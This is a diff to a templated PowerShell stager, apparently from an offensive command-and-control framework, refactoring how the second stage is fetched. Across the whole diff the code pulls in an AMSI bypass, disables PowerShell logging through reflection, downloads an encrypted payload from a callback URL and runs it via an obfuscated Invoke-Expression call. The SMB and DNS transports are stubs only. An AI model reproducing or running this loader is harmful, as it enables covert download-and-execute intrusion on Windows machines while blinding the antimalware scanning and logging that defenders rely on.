@@ -10,7 +10,7 @@ function {{symbol_name("Decrypt-String")}} {
   	)
     $result = [System.Convert]::FromBase64String($string)
     $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
-    $result = [System.Text.Encoding]::ASCII.GetString($result)
+    $result = [System.Text.Encoding]::UTF8.GetString($result)
     $result
 }
 
@@ -21,15 +21,25 @@ $string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
 if ($PSVersionTable.PSVersion.Major -ge 5) {
     {% include "powershell/am0nsec-amsi-bypass.ps1" %}
 
+    {# Disable Logging #}
     $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
     $settings[$string5] = @{}
     $settings[$string5].Add($string6, "0")
 }
 
-$K=new-object net.webclient
-$K.proxy=[Net.WebRequest]::GetSystemWebProxy()
-$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
-$code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))
+
+{% if transport in ['http', 'https'] %}
+    $WebClient = $K{# defined in the launcher #}
+    function {{symbol_name("Transport-String")}} {
+        return {{symbol_name("Decrypt-String")}} ($WebClient.DownloadString(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))
+}
+{% elif transport == 'smb' %}
+    {# TODO #}
+{% elif transport == 'dns' %}
+    {# TODO #}
+{% endif %}
+
+$code = {{symbol_name("Transport-String")}}
 
 {#clever obfuscation#}
 & (gcm i*k`e-e*n) $code
